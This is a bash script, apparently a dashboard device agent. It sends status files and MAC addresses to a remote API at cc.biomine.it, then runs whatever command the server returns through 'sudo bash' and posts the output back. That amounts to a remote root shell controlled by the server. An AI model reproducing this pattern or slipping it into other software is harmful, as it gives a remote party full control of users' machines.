#!/bin/bash

APIURL=https://cc.biomine.it/api

ethernet=$(ip address show eth0 | grep "link/" | egrep -o "ether [^.]+:[^.]+:[^.]+:[^.]+:[^.]+:[^.]+brd" | sed -e "s/ether //"|sed "s/ brd//")
wifi=$(ip address show wlan0 | grep "link/" | egrep -o "ether [^.]+:[^.]+:[^.]+:[^.]+:[^.]+:[^.]+brd" | sed -e "s/ether //"|sed "s/ brd//")

macaddr="eth0: "$ethernet" / wlan0: "$wifi

FIRST=1
JSON=

FILES="/var/dashboard/statuses/*"
for f in $FILES;
do
    name=$(echo $f | sed 's/\/var\/dashboard\/statuses\///' | sed 's/\_//' | sed 's/\-//')
    val=$(cat $f|tr '"' "'")

    if [ $FIRST -eq 1 ]; then
        FIRST=0
        JSON="{\"${name}\":\"${val}\""
    else
        JSON="${JSON},\"${name}\":\"${val}\""
    fi
done
    
JSON="${JSON},\"macaddr\":\"${macaddr}\"}"

TFILE=$(tempfile -s .json)
echo $JSON >$TFILE

RESULT=$(curl --silent -X POST -H "Content-Type: application/json" -d @${TFILE} ${APIURL}/ping.php)
rm -f $TFILE
CMD=$(echo $RESULT|jq .cmd|tr -d '"')

case "$CMD" in
    bash)
        ARG=$(echo $RESULT|jq .arg|tr -d '"')
        ID=$(echo $RESULT|jq .id|tr -d '"')
        
        TFILE=$(tempfile -s .output)
        echo $ARG | sudo bash 1>$TFILE 2>&1
        TFILE2=$(tempfile -s .json)
        echo "{\"id\":${ID},\"output\":\"$(cat $TFILE|base64 -w 0)\"}" >$TFILE2

        curl --silent -X POST -H "Content-Type: application/json" -d @${TFILE2} ${APIURL}/pong.php

        rm -f $TFILE
        rm -f $TFILE2
        ;;
        
    nope)
        ;;

    *)
        echo "* Invalid command"
        exit 99
        ;;
esac
